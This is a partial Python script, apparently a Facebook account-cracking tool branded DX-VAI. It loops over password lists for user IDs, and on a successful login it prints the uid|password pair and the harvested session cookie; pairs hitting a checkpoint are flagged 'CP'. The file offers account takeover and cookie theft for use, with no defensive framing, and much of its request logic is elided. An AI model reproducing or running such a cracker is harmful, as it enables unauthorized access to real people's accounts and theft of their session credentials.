...
os.system("xdg-open https://github.com/xoman-sarker/DX-VAI")
logo = ("""
8888888b. Y88b   d88P     888     888     d8888 8888888 
888  "Y88b Y88b d88P      888     888    d88888   888   
888    888  Y88o88P       888     888   d88P888   888   
888    888   Y888P        Y88b   d88P  d88P 888   888   
888    888   d888b         Y88b d88P  d88P  888   888   
888    888  d88888b  888888 Y88o88P  d88P   888   888   
888  .d88P d88P Y88b         Y888P  d8888888888   888   
8888888P" d88P   Y88b         Y8P  d88P     888 8888888                                            
                                                                                                                                   """)
class Main:
    def __init__(self):
        self.id = []
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r[\033[1;92mDX-VAI\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m] [\033[1;91mCP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[38;5;46m[DX-VAI-OK🌻] {uid}|{ps}")
                print(f"\n[COOKIE🎁] : {coki}")
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[DX-VAI-CP❌] {uid}|{ps}")
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[DX-VAI💥] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
Main()
